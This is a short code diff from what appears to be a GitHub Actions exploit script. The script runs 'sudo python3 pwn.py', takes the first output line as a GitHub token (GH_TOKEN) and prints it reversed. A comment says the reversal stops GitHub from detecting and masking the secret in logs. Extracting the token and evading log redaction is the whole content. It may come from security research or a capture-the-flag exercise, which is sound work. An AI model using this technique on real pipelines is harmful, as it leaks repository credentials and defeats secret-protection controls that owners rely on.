@@ -5,10 +5,10 @@ result = subprocess.run(['bash', '-c', """sudo python3 pwn.py | tr -d '\\0' | gr
 
 print("Hello World.")
 
-print(result.stdout[::-1])
-print(result.stderr)
+#print(result.stdout[::-1])
+#print(result.stderr)
 
 r = result.stdout.split("\n")[0]
-print(r[::-1])
+print(r[::-1]) # need to print in reverse, otherwise it will be detected and *** by GitHub
 
 GH_TOKEN = r
